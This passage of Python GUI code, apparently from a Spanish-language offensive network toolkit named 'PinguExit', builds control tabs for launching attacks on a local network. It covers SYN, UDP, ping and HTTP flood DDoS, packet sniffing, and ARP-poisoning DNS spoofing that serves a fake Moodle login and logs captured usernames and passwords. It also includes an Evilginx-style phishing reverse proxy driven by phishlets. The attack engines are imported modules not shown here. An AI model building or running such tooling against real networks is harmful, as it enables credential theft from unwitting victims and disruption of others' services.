            result_callback  = lambda results: self.root.after(0, lambda r=results: self._scan_populate(r))
        )

    def _scan_populate(self, results: list):
        """Construye las filas interactivas de la tabla de resultados del escáner.

        Re-escaneo incremental: conserva los dispositivos escaneados anteriormente,
        incorpora los dispositivos nuevos y elimina automáticamente los que ya no responden.
        """
        results = sorted(results, key=lambda x: ipaddress.ip_address(x["ip"]))
        results = enriquecer_resultados(results)

        if self._scan_results_data:
            # Mapa de dispositivos del escaneo anterior
            prev_by_mac = {item.get("mac", "").lower(): item for item in self._scan_results_data}
            current_macs = {item.get("mac", "").lower() for item in results}

            num_nuevos = sum(1 for m in current_macs if m not in prev_by_mac)
            num_eliminados = sum(1 for m in prev_by_mac if m not in current_macs)

            merged = []
            for item in results:
                mac_key = item.get("mac", "").lower()
                if mac_key in prev_by_mac:
                    # Dispositivo ya existía: conservar alias, notas y hostname previo si aplica
                    prev = prev_by_mac[mac_key]
                    if prev.get("alias") and not item.get("alias"):
                        item["alias"] = prev["alias"]
                    if prev.get("notas") and not item.get("notas"):
                        item["notas"] = prev["notas"]
                    if prev.get("hostname") and not item.get("hostname"):
                        item["hostname"] = prev["hostname"]
                    if prev.get("known"):
                        item["known"] = True
                    item["es_nuevo"] = False
                else:
                    item["es_nuevo"] = True
                merged.append(item)

            self._scan_results_data = merged

            # Detalles claros del re-escaneo
            detalles = []
            if num_nuevos > 0:
                detalles.append(f"+{num_nuevos} nuevo{'s' if num_nuevos > 1 else ''}")
            if num_eliminados > 0:
                detalles.append(f"-{num_eliminados} desconectado{'s' if num_eliminados > 1 else ''}")

            if detalles:
                info_txt = f"{len(merged)} activos ({', '.join(detalles)})"
            else:
                info_txt = f"{len(merged)} activos (sin cambios)"

            self._scan_lbl_count.configure(text=info_txt, text_color="#69f0ae")
            self._log(f"[SCAN] Actualizado: {info_txt}", "ok")
        else:
            for item in results:
                item["es_nuevo"] = False
            self._scan_results_data = results
            self._scan_lbl_count.configure(text=f"{len(results)} dispositivos encontrados", text_color="#69f0ae")
            self._log(f"[SCAN] Fin: {len(results)} dispositivos encontrados.", "ok")

        self._scan_render(self._scan_results_data)

    def _scan_apply_filter(self):
        """Aplica el filtro de búsqueda en tiempo real sobre los resultados."""
        filtro = self.scan_filter_var.get().strip().lower()
        if not filtro:
            self._scan_render(self._scan_results_data)
            return

        filtered = []
        for item in self._scan_results_data:
            # Buscar en IP, MAC, hostname, alias, SO, rol
            haystack = " ".join([
                item.get("ip", ""),
                item.get("mac", ""),
                item.get("hostname", ""),
                item.get("alias", ""),
                item.get("os", ""),
                item.get("rol", ""),
            ]).lower()
            if filtro in haystack:
                filtered.append(item)
        self._scan_render(filtered)

    def _scan_render(self, results: list):
        """Renderiza las filas de resultados en la tabla."""
        for w in self.scan_results_frame.winfo_children():
            w.destroy()

        total = len(self._scan_results_data)
        shown = len(results)
        if total > 0:
            txt = f"{shown}/{total} dispositivos" if shown != total else f"{total} dispositivos encontrados"
            self._scan_lbl_count.configure(text=txt)
        else:
            self._scan_lbl_count.configure(text="")

        so_colores = {
            "Windows":     "#64b5f6",
            "Linux":       "#81c784",
            "Mac":         "#ce93d8",
            "Router":      "#ffb74d",
            "Desconocido": "#607d8b",
        }
        # Abreviar SO para ancho consistente
        so_corto = {
            "Desconocido": "N/D",
        }

        for idx, item in enumerate(results):
            ip       = item["ip"]
            mac      = item["mac"]
            os_name  = item.get("os", "Desconocido")
            hostname = item.get("hostname", "")
            alias    = item.get("alias", "")
            rol      = item["rol"]
            known    = item.get("known", False)

            # Fila con colores alternados
            row = ctk.CTkFrame(
                self.scan_results_frame,
                fg_color="#131318" if idx % 2 == 0 else "#0e0e12",
                corner_radius=4
            )
            row.pack(fill="x", pady=1, padx=2)

            # SO — texto abreviado si es "Desconocido"
            so_txt = so_corto.get(os_name, os_name)
            so_color = so_colores.get(os_name, "#607d8b")
            ctk.CTkLabel(row, text=so_txt, width=55, anchor="center",
                         font=ctk.CTkFont(size=12, weight="bold"),
                         text_color=so_color).pack(side="left", padx=3)
            # IP
            ctk.CTkLabel(row, text=ip, width=105, anchor="center",
                         font=ctk.CTkFont(family="Consolas", size=12),
                         text_color="#4fc3f7").pack(side="left", padx=3)
            # MAC
            ctk.CTkLabel(row, text=mac, width=130, anchor="center",
                         font=ctk.CTkFont(family="Consolas", size=12),
                         text_color="#b39ddb").pack(side="left", padx=3)
            # Hostname (muestra 'Desconocido' si no se resuelve)
            if hostname and hostname != "Desconocido":
                host_txt = hostname[:15]
                host_color = "#80cbc4"
            else:
                host_txt = "Desconocido"
                host_color = "#607d8b"

            ctk.CTkLabel(row, text=host_txt, width=110, anchor="center",
                         font=ctk.CTkFont(size=12),
                         text_color=host_color).pack(side="left", padx=3)
            # Alias (de la BD) o indicador de nuevo dispositivo
            es_nuevo = item.get("es_nuevo", False)
            if alias:
                alias_txt = alias[:20]
                alias_color = "#ffd54f"
            elif es_nuevo:
                alias_txt = "★ Nuevo"
                alias_color = "#00e676"
            elif known:
                alias_txt = "✓ Guardado"
                alias_color = "#558855"
            else:
                alias_txt = "—"
                alias_color = "#444444"

            ctk.CTkLabel(row, text=alias_txt, width=140, anchor="center",
                         font=ctk.CTkFont(size=12, weight="bold" if (alias or es_nuevo) else "normal"),
                         text_color=alias_color).pack(side="left", padx=3)
            # Rol
            ctk.CTkLabel(row, text=rol, width=65, anchor="center",
                         font=ctk.CTkFont(size=12),
                         text_color="#ffca28" if "Gateway" in rol else "#90a4ae").pack(side="left", padx=3)

            # Botón ARP
            ctk.CTkButton(
                row, text="ARP", width=40, height=26,
                fg_color="#5c1a1a", hover_color="#8b2a2a",
                font=ctk.CTkFont(size=11, weight="bold"),
                corner_radius=5,
                command=lambda _ip=ip: self._scan_fill_arp(_ip)
            ).pack(side="left", padx=3, pady=3)

            # Botón MAC
            ctk.CTkButton(
                row, text="MAC", width=40, height=26,
                fg_color="#5c3a0a", hover_color="#8b5a2a",
                font=ctk.CTkFont(size=11, weight="bold"),
                corner_radius=5,
                command=lambda _mac=mac: self._scan_fill_arp(_mac)
            ).pack(side="left", padx=3, pady=3)

            # Botón DDoS
            ctk.CTkButton(
                row, text="DDoS", width=44, height=26,
                fg_color="#1a1a5c", hover_color="#2e2e8b",
                font=ctk.CTkFont(size=11, weight="bold"),
                corner_radius=5,
                command=lambda _ip=ip: self._scan_fill_ddos(_ip)
            ).pack(side="left", padx=3, pady=3)

            # Botón Etiqueta
            btn_eti_txt = "🏷️ Editar etiqueta" if alias else "🏷️ Añadir etiqueta"
            ctk.CTkButton(
                row, text=btn_eti_txt, width=120, height=26,
                fg_color="#1f2937", hover_color="#374151",
                font=ctk.CTkFont(size=11),
                corner_radius=5,
                command=lambda _m=mac, _ip=ip, _h=hostname: self._scan_edit_device(_m, _ip, _h)
            ).pack(side="left", padx=3, pady=3)

    def _scan_guardar_bd(self):
        """Guarda todos los dispositivos del último escaneo en la base de datos."""
        if not self._scan_results_data:
            messagebox.showinfo("BD", "No hay resultados de escaneo para guardar.")
            return
        guardar_escaneo(self._scan_results_data)
        # Re-enriquecer para mostrar el estado actualizado
        self._scan_results_data = enriquecer_resultados(self._scan_results_data)
        self._scan_apply_filter()
        n = len(self._scan_results_data)
        self._log(f"[BD] {n} dispositivos guardados en la base de datos.", "ok")
        messagebox.showinfo("BD", f"{n} dispositivos guardados correctamente.")

    def _scan_edit_device(self, mac, ip, hostname):
        """Abre un diálogo para editar la etiqueta (alias) y notas de un dispositivo."""
        # Obtener datos actuales de la BD
        alias_actual = obtener_alias(mac)
        notas_actual = obtener_notas(mac)

        # Crear ventana de diálogo
        dlg = ctk.CTkToplevel(self.root)
        dlg.title(f"🏷️ Etiquetar dispositivo — {ip}")
        dlg.geometry("440x410")
        dlg.minsize(440, 410)
        dlg.attributes("-topmost", True)
        dlg.grab_set()

        ctk.CTkLabel(dlg, text=f"🏷️ Etiquetar Dispositivo: {ip}",
                     font=ctk.CTkFont(size=14, weight="bold"),
                     text_color="#4fc3f7").pack(anchor="w", padx=16, pady=(16, 2))
        ctk.CTkLabel(dlg, text=f"MAC: {mac}",
                     font=ctk.CTkFont(family="Consolas", size=11),
                     text_color="#ce93d8").pack(anchor="w", padx=16, pady=(0, 2))
        if hostname and hostname != "Desconocido":
            ctk.CTkLabel(dlg, text=f"Host: {hostname}",
                         font=ctk.CTkFont(size=11),
                         text_color="#80cbc4").pack(anchor="w", padx=16, pady=(0, 2))

        ctk.CTkFrame(dlg, height=1, fg_color="#252525").pack(fill="x", padx=16, pady=8)

        # Etiqueta / Alias
        ctk.CTkLabel(dlg, text="Etiqueta / Nombre personalizado (Alias):",
                     font=ctk.CTkFont(size=12, weight="bold")).pack(anchor="w", padx=16, pady=(0, 2))
        alias_entry = ctk.CTkEntry(dlg, width=400, fg_color="#111111",
                                    border_color="#2a2a2a",
                                    placeholder_text="Ej: PC Principal, Portátil, Router...")
        alias_entry.pack(padx=16, pady=(0, 2))
        if alias_actual:
            alias_entry.insert(0, alias_actual)

        ctk.CTkLabel(dlg, text="💡 Presiona Enter o clic en 'Guardar Etiqueta' para aplicar.",
                     font=ctk.CTkFont(size=10), text_color="#78909c").pack(anchor="w", padx=16, pady=(0, 8))

        # Notas
        ctk.CTkLabel(dlg, text="Notas adicionales:",
                     font=ctk.CTkFont(size=12)).pack(anchor="w", padx=16, pady=(0, 2))
        notas_box = ctk.CTkTextbox(dlg, height=75, fg_color="#0a0a0a",
                                    border_width=1, border_color="#1e1e1e",
                                    font=("Consolas", 12))
        notas_box.pack(fill="x", padx=16, pady=(0, 12))
        if notas_actual:
            notas_box._textbox.insert("1.0", notas_actual)

        def _guardar():
            nuevo_alias = alias_entry.get().strip()
            nuevas_notas = notas_box._textbox.get("1.0", "end").strip()
            establecer_alias(mac, nuevo_alias)
            establecer_notas(mac, nuevas_notas)
            # Actualizar los datos en memoria y re-renderizar
            for item in self._scan_results_data:
                if item.get("mac", "").lower() == mac.lower():
                    item["alias"] = nuevo_alias
                    item["notas"] = nuevas_notas
                    item["known"] = bool(nuevo_alias or nuevas_notas)
            self._scan_apply_filter()
            self._log(f"[BD] Etiqueta guardada: {mac} ({ip}) → '{nuevo_alias}'", "ok")
            dlg.destroy()

        # Permitir guardar pulsando Enter en el campo de etiqueta
        alias_entry.bind("<Return>", lambda _: _guardar())
        alias_entry.focus_set()

        btn_row = ctk.CTkFrame(dlg, fg_color="transparent")
        btn_row.pack(fill="x", padx=16, pady=(0, 14))
        self._btn(btn_row, "💾 Guardar Etiqueta", _guardar, "#1565c0", width=150, height=34).pack(side="left", padx=(0, 8))
        self._btn(btn_row, "Cancelar", dlg.destroy, "#37474f", width=100, height=34).pack(side="left")

    def _scan_fill_arp(self, ip: str):
        """Rellena el campo objetivo de la pestaña ARP y cambia a esa pestaña."""
        if self.arp_obj:
            self.arp_obj.delete(0, "end")
            self.arp_obj.insert(0, ip)
        self.nb.set("⚡ ARP")

    def _scan_fill_ddos(self, ip: str):
        """Rellena el campo IP objetivo de la pestaña DDoS y cambia a esa pestaña."""
        if self.ddos_ip:
            self.ddos_ip.delete(0, "end")
            self.ddos_ip.insert(0, ip)
        self.nb.set("💥 DDoS")

    # ── DDoS ─────────────────────────────────────────────────────────────────
    def _build_ddos(self, p):
        """Construye la pestaña DDoS."""
        _pad(p)
        ctk.CTkLabel(p, text="DDoS Local — Denegación de servicio en LAN",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0, 6))

        self.ddos_ip      = _campo(p, "IP objetivo:",          "192.168.1.XX")
        self.ddos_pto     = _campo(p, "Puerto:",               valor="80",  width=70)
        self.ddos_threads = _campo(p, "Hilos (Multi-thread):", valor="50",  width=70)

        mode_row = ctk.CTkFrame(p, fg_color="transparent")
        mode_row.pack(fill="x", pady=3)
        ctk.CTkLabel(mode_row, text="Modo:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        self.ddos_modo = ctk.StringVar(value="SYN Flood")
        ctk.CTkOptionMenu(
            mode_row,
            values=["SYN Flood", "Ping Flood", "UDP Flood", "HTTP GET Flood", "HTTP POST Flood"],
            variable=self.ddos_modo, width=150,
            fg_color="#1a1a1a", button_color="#1565c0",
            font=ctk.CTkFont(size=12)
        ).pack(side="left")

        self.ddos_ua_rot = ctk.BooleanVar(value=True)
        ctk.CTkSwitch(mode_row, text="Rotación U-A",
                      variable=self.ddos_ua_rot,
                      font=ctk.CTkFont(size=11)).pack(side="left", padx=15)

        bf = _btn_row(p)
        self.ddos_start_btn = self._btn(bf, "▶ Lanzar DDoS", self._ddos_start, "#b71c1c")
        self.ddos_start_btn.pack(side="left", padx=(0, 10))
        self.ddos_stop_btn = self._btn(bf, "■ Detener", self._ddos_stop, "#37474f")
        self.ddos_stop_btn.configure(state="disabled")
        self.ddos_stop_btn.pack(side="left")

        _sep(p)
        self.ddos_out = _out(p, 8)

    def _ddos_start(self):
        modo = self.ddos_modo.get()
        needs_scapy = modo not in ["HTTP GET Flood", "HTTP POST Flood"]
        if needs_scapy and not SCAPY_OK:
            self._npcap_warn()
            return

        ip = self.ddos_ip.get().strip()
        if not ip:
            messagebox.showwarning("Aviso", "Introduce la IP del objetivo.")
            return
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            messagebox.showwarning("Error de Entrada", "La IP objetivo no tiene un formato válido.")
            return

        try:
            pto = int(self.ddos_pto.get())
            if not (1 <= pto <= 65535):
                raise ValueError()
        except ValueError:
            messagebox.showwarning("Error de Entrada", "El puerto debe ser un número entero entre 1 y 65535.")
            return

        try:
            threads = int(self.ddos_threads.get())
            if not (1 <= threads <= 1000):
                raise ValueError()
        except ValueError:
            messagebox.showwarning("Error de Entrada", "Hilos: entero 1 a 1000.")
            return

        use_ua = self.ddos_ua_rot.get()

        if self.ddos_module.start_attack(
            ip, pto, modo, threads, use_ua,
            lambda txt: self._write(self.ddos_out, txt), self._ddos_stop
        ):
            self.ddos_start_btn.configure(state="disabled", fg_color="#37474f")
            self.ddos_stop_btn.configure(state="normal",   fg_color="#b71c1c")
            self.ddos_out.delete("1.0", "end")
            self._badge_set("ddos", True)

    def _ddos_stop(self):
        self.ddos_module.stop_attack(lambda txt: self._write(self.ddos_out, txt))
        self.ddos_start_btn.configure(state="normal",   fg_color="#b71c1c")
        self.ddos_stop_btn.configure(state="disabled",  fg_color="#37474f")
        self._badge_set("ddos", False)

    # ── SNIFFER ───────────────────────────────────────────────────────────────
    def _build_sniffer(self, p):
        """Construye la pestaña Sniffer."""
        _pad(p)
        ctk.CTkLabel(p, text="Sniffer — Captura de paquetes en tiempo real",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0, 6))

        self.sniff_filtro = _campo(p, "Filtro BPF (vacío=todo):",
                                   "ej: tcp port 80  |  udp port 53", width=280)

        presets_row = ctk.CTkFrame(p, fg_color="transparent")
        presets_row.pack(fill="x", pady=(0, 6))
        ctk.CTkLabel(presets_row, text="Presets:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        for label, flt in [("HTTP", "tcp port 80"), ("DNS", "udp port 53"),
                            ("HTTPS", "tcp port 443"), ("ARP", "arp"), ("Todo", "")]:
            self._btn(presets_row, label, lambda f=flt: self._sniff_preset(f),
                      "#1a237e", width=62).pack(side="left", padx=2)

        bf = _btn_row(p)
        self.sniff_start_btn = self._btn(bf, "▶ Iniciar captura", self._sniff_start, "#6a1b9a")
        self.sniff_start_btn.pack(side="left", padx=(0, 10))
        self.sniff_stop_btn = self._btn(bf, "■ Detener", self._sniff_stop, "#37474f")
        self.sniff_stop_btn.configure(state="disabled")
        self.sniff_stop_btn.pack(side="left")
        self.sniff_count = ctk.CTkLabel(bf, text="0 pkts",
                                        font=ctk.CTkFont(size=11), text_color="#555555")
        self.sniff_count.pack(side="right", padx=10)

        _sep(p)
        self.sniff_out = _out(p, 12)
        self.logger_engine.reset_sniff_count()

    def _sniff_preset(self, flt):
        self.sniff_filtro.delete(0, "end")
        if flt:
            self.sniff_filtro.insert(0, flt)

    def _sniff_start(self):
        if not SCAPY_OK:
            self._npcap_warn()
            return

        filtro = self.sniff_filtro.get().strip()
        self.logger_engine.reset_sniff_count()

        if self.sniffer_module.start_capture(
            filtro,
            lambda txt: self._write(self.sniff_out, txt),
            lambda count: self._sniff_stop(count)
        ):
            self.sniff_start_btn.configure(state="disabled", fg_color="#37474f")
            self.sniff_stop_btn.configure(state="normal",    fg_color="#6a1b9a")
            self.sniff_out.delete("1.0", "end")
            self._write(self.sniff_out,
                        f"» Capturando — filtro: '{filtro or 'cualquier paquete'}'\n" + "─"*48 + "\n")
            self._log(f"[SNIFF] Iniciado. Filtro: '{filtro or 'ninguno'}'", "info")
            self._badge_set("sniff", True)

    def _sniff_stop(self, packet_count=0):
        self.sniffer_module.stop_capture(lambda txt: self._write(self.sniff_out, txt), packet_count)
        self.sniff_start_btn.configure(state="normal",   fg_color="#6a1b9a")
        self.sniff_stop_btn.configure(state="disabled",  fg_color="#37474f")
        self._badge_set("sniff", False)

    # ── DNS ──────────────────────────────────────────────────────────────────
    def _build_dns(self, p):
        """Construye la pestaña DNS Spoofing completa (ARP + DNS + HTTP)."""
        _pad(p)
        ctk.CTkLabel(p, text="DNS Spoofing — Ataque MITM completo",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#e65100").pack(anchor="w", padx=4, pady=(0, 2))
        ctk.CTkLabel(
            p,
            text="Intercepta peticiones DNS de la victima y le muestra una pagina falsa.",
            font=ctk.CTkFont(size=11), text_color="#546e7a"
        ).pack(anchor="w", padx=4, pady=(0, 8))
        self.dns_dom     = _campo(p, "Dominio a interceptar:", "ej: moodle.instituto.es", width=280)
        self.dns_victima = _campo(p, "IP de la victima:", "ej: 192.168.1.50", width=280)
        page_row = ctk.CTkFrame(p, fg_color="transparent")
        page_row.pack(fill="x", pady=3)
        ctk.CTkLabel(page_row, text="Pagina falsa a mostrar:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        paginas = self.dns_spoof_module.get_pages()
        self.dns_pagina_var = ctk.StringVar(value=paginas[0] if paginas else "Moodle (login)")
        ctk.CTkOptionMenu(
            page_row, values=paginas, variable=self.dns_pagina_var,
            width=260, fg_color="#111111", button_color="#e65100",
            font=ctk.CTkFont(size=11),
        ).pack(side="left", padx=(0, 8))
        _sep(p)
        info_frame = ctk.CTkFrame(p, fg_color="#0f1a0f", corner_radius=6,
                                  border_width=1, border_color="#1b5e20")
        info_frame.pack(fill="x", padx=2, pady=(0, 6))
        ctk.CTkLabel(
            info_frame,
            text=(
                "  Como funciona:\n"
                "  1. Envenena la tabla ARP de la victima (su trafico pasa por ti)\n"
                "  2. Intercepta sus peticiones DNS y responde con tu IP\n"
                "  3. Sirve la pagina falsa elegida en el puerto 80\n"
                "  4. Captura credenciales del formulario -> logs/dns_capturas.txt"
            ),
            font=ctk.CTkFont(size=10), text_color="#66bb6a",
            justify="left", anchor="w",
        ).pack(anchor="w", padx=8, pady=6)
        bf = _btn_row(p, pady=4)
        self.dns_start_btn = self._btn(bf, "Iniciar Ataque DNS", self._dns_start, "#c62828")
        self.dns_start_btn.pack(side="left", padx=(0, 10))
        self.dns_stop_btn = self._btn(bf, "Detener Todo", self._dns_stop, "#37474f")
        self.dns_stop_btn.configure(state="disabled")
        self.dns_stop_btn.pack(side="left", padx=(0, 10))
        self._btn(bf, "Ver capturas", self._dns_ver_capturas, "#1565c0").pack(side="left")
        _sep(p)
        ctk.CTkLabel(p, text="Log del ataque:",
                     font=ctk.CTkFont(size=10), text_color="#455a64").pack(anchor="w")
        self.dns_out = _out(p, 9)

    def _dns_start(self):
        if not SCAPY_OK:
            self._npcap_warn()
            return
        dominio = self.dns_dom.get().strip().lower()
        for prefix in ("https://", "http://", "www."):
            if dominio.startswith(prefix):
                dominio = dominio[len(prefix):]
        dominio = dominio.strip("/")
        if not dominio:
            messagebox.showwarning("Aviso", "Introduce el dominio a interceptar.\nEjemplo: moodle.instituto.es")
            return
        ip_victima = self.dns_victima.get().strip()
        if not ip_victima:
            messagebox.showwarning("Aviso", "Introduce la IP de la victima.")
            return
        try:
            import ipaddress as _ipa
            _ipa.ip_address(ip_victima)
        except ValueError:
            messagebox.showwarning("Error", f"IP no valida: {ip_victima!r}")
            return
        pagina = self.dns_pagina_var.get()
        self.dns_dom.delete(0, "end")
        self.dns_dom.insert(0, dominio)
        self.dns_start_btn.configure(state="disabled", fg_color="#37474f")
        self.dns_stop_btn.configure(state="normal", fg_color="#c62828")
        self.dns_out.delete("1.0", "end")
        self._badge_set("dns", True)
        def on_stop():
            self.root.after(0, lambda: self.dns_start_btn.configure(state="normal", fg_color="#c62828"))
            self.root.after(0, lambda: self.dns_stop_btn.configure(state="disabled", fg_color="#37474f"))
            self.root.after(0, lambda: self._badge_set("dns", False))
        self.dns_spoof_module.start_all(
            dominio=dominio, ip_victima=ip_victima, pagina=pagina,
            write_callback=lambda txt: self._write(self.dns_out, txt),
            on_stop_callback=on_stop,
        )
        self._log(f"[DNS] Ataque iniciado -> {dominio} ({ip_victima})", "warn")

    def _dns_stop(self):
        self.dns_spoof_module.stop_all(lambda txt: self._write(self.dns_out, txt))
        self.dns_start_btn.configure(state="normal", fg_color="#c62828")
        self.dns_stop_btn.configure(state="disabled", fg_color="#37474f")
        self._badge_set("dns", False)
        self._log("[DNS] Ataque detenido.", "warn")

    def _dns_ver_capturas(self):
        capturas = self.dns_spoof_module.get_capturas()
        self._write(self.dns_out, "\n" + "=" * 48 + "\n")
        self._write(self.dns_out, f"  Capturas totales: {len(capturas)}\n")
        self._write(self.dns_out, "=" * 48 + "\n")
        if not capturas:
            self._write(self.dns_out, "  (Sin capturas todavia)\n")
        else:
            for c in capturas:
                self._write(
                    self.dns_out,
                    f"  [{c.get('timestamp','')}] "
                    f"IP={c.get('ip_origen','')}  "
                    f"user={c.get('usuario','')}  "
                    f"pass={c.get('password','')}\n"
                )
        self._write(self.dns_out, "=" * 48 + "\n\n")

    # ── CAPTURA ──────────────────────────────────────────────────────────────
    def _build_captura(self, p):
        """Construye la pestaña CAPTURA — Proxy reverso dinámico."""
        _pad(p)
        ctk.CTkLabel(p, text="Reverse Proxy Dinámico (Evilginx2 Style)",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#b71c1c").pack(anchor="w", padx=4, pady=(0, 4))

        ctk.CTkLabel(
            p,
            text=f"Servidor escucha en puerto 80  |  IP local: {IP_LOCAL}",
            font=ctk.CTkFont(size=11), text_color="#455a64"
        ).pack(anchor="w", padx=4, pady=(0, 6))

        self.cap_target = _campo(p, "URL Real a clonar/interceptar:",
                                 "Ej: https://moodle.ejemplo.com", width=280)

        phish_row = ctk.CTkFrame(p, fg_color="transparent")
        phish_row.pack(fill="x", pady=4)
        ctk.CTkLabel(phish_row, text="Phishlet (Plantilla):", width=160, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")

        phishlets = self.proxy_module.get_available_phishlets() or ["Ninguno"]
        self.cap_phishlet_var = ctk.StringVar(value=phishlets[0])
        ctk.CTkOptionMenu(phish_row, values=phishlets, variable=self.cap_phishlet_var, width=150,
                          fg_color="#111111", button_color="#880e4f",
                          font=ctk.CTkFont(size=12)).pack(side="left")

        bf_cap = _btn_row(p, pady=4)
        self.cap_proxy_btn = self._btn(
            bf_cap, "🎓 Activar Proxy Dinámico (Auto DNS+HTTP)",
            self._cap_proxy_dinamico, "#4a148c"
        )
        self.cap_proxy_btn.pack(side="left", padx=(0, 10))

        self.cap_stop_btn = self._btn(bf_cap, "■ Detener Servidor", self._cap_stop, "#37474f")
        self.cap_stop_btn.configure(state="disabled")
        self.cap_stop_btn.pack(side="left")

        _sep(p)
        ctk.CTkLabel(p, text="Log de capturas:",
                     font=ctk.CTkFont(size=10), text_color="#455a64").pack(anchor="w")
        self.cap_out = _out(p, 10)

    # ── Captura handlers ──────────────────────────────────────────────────────
    def _cap_stop(self):
        self.proxy_module.stop_server(lambda txt: self._write(self.cap_out, txt))
        self.cap_proxy_btn.configure(state="normal",   fg_color="#4a148c")
        self.cap_stop_btn.configure(state="disabled",  fg_color="#37474f")

    def _cap_proxy_dinamico(self):
        target = self.cap_target.get().strip()
        if not target or not target.startswith("http"):
            messagebox.showwarning("Error", "Introduce una URL válida que empiece por http:// o https://")
            return

        phishlet = self.cap_phishlet_var.get()
        if phishlet == "Ninguno":
            messagebox.showwarning("Error", "No se han detectado archivos JSON de phishlets en data/phishlets")
            return

        if self.proxy_module.activate_dynamic_proxy(
            target, phishlet, lambda txt: self._write(self.cap_out, txt)
        ):
            self.cap_proxy_btn.configure(state="disabled", fg_color="#37474f")
            self.cap_stop_btn.configure(state="normal",    fg_color="#880e4f")


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    ventana = ctk.CTk()
    app = PinguExit(ventana)
    ventana.mainloop()

